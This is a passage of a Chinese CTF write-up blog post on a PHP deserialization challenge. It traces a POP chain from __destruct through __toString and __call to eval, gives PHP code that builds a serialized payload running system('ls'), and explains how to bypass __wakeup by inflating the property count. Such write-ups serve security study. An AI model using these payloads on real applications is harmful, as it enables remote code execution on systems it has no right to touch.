<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>__call() // 在对象上下文中调用不可访问的方法时触发</p>
+<p>__toString() // 当一个对象被当作一个字符串被调用。</p>
+<p>关于php反序列化有一些做题技巧，一般分为正推和反推，这里我反推一遍</p>
+<ol>
+<li>
+<p>实现要先找到关键函数，比如可以进行代码执行的evals,system等或者文件包含函数等等</p>
+</li>
+<li>
+<p>发现A类中__call方法会执行eval命令，再寻找触发__call的点</p>
+</li>
+<li>
+<p>在C类的__toString方法会使key2变量调用abab()方法，如果key2变量为A类那么就可以触发__call方法，再寻找触发__toString方法的点</p>
+</li>
+<li>
+<p>在B类的__destruct()方法中会输出key变量，如果key变量为C类那么就可以触发__toString方法，而__destruct()方法是销毁时调用，只需要创建出B类就能调用执行</p>
+</li>
+</ol>
+<p>到此整个pop链的结构已经明晰了</p>
+<p>__destruct() —&gt; __toString —&gt; __call —&gt; eval()任意代码执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> class A&#123;</span><br><span class="line">   public <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> class B&#123;</span><br><span class="line">   public <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"> class C&#123;</span><br><span class="line">   private <span class="variable">$key2</span>;</span><br><span class="line">   <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">     <span class="variable">$this</span>-&gt;key2 = new A();</span><br><span class="line">     <span class="variable">$this</span> -&gt;key2 -&gt;code = <span class="string">&#x27;system(\&#x27;</span><span class="built_in">ls</span>\<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$b</span> = new B();</span><br><span class="line"> <span class="variable">$c</span> = new C();</span><br><span class="line"> <span class="variable">$b</span> -&gt;key = <span class="variable">$c</span>;</span><br><span class="line"> <span class="built_in">echo</span> serialize(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
+<p>有几点需要注意：</p>
+<ol>
+<li>
+<p>C类的key2变量是私有的要给它赋值要在类内使用__construct()方法赋值</p>
+</li>
+<li>
+<p>私有变量序列化后要添加标记%00类名%00。s:17:“%00类名%00op”;i:2;</p>
+</li>
+<li>
+<p>要绕过__wakeup()</p>
+</li>
+<li>
+<p>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;B&quot;:1:&#123;s:3:&quot;key&quot;;O:1:&quot;C&quot;:1:&#123;s:7:&quot;Ckey2&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:13:&quot;system(&#x27;ls&#x27;);&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;B&quot;:1:&#123;s:3:&quot;key&quot;;O:1:&quot;C&quot;:1:&#123;s:7:&quot;%00C%00key2&quot;;O:1:&quot;A&quot;:2:&#123;s:4:&quot;code&quot;;s:13:&quot;system(&#x27;ls&#x27;);&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里有个坑，因为flag并没在显眼的文件里，在linux的环境变量里，用printenv打印所有变量显示出flag</p>
+<p>一般我们在注入成功后寻找flag，在网站目录里和根目录下没有flag相关的文件，那么就要考虑一下是否在其他位置比如环境变量</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%AB%9E%E8%B5%9B/" rel="tag"># 大学生竞赛</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/20221115/penetration-testing-guide/directory-searching/" rel="prev" title="三款目录扫描工具横向对比，总有一款是你的菜">
+      <i class="fa fa-chevron-left"></i> 三款目录扫描工具横向对比，总有一款是你的菜
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/20221122/ctf/unctf-misc/" rel="next" title="UNCTF-misc 大学生竞赛解析（二）">
+      UNCTF-misc 大学生竞赛解析（二） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">助安社区 <a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">京ICP备2022030632号-1 </a>  all right reserved</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://blog.sechelper.com/" class="theme-link">sechelper</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
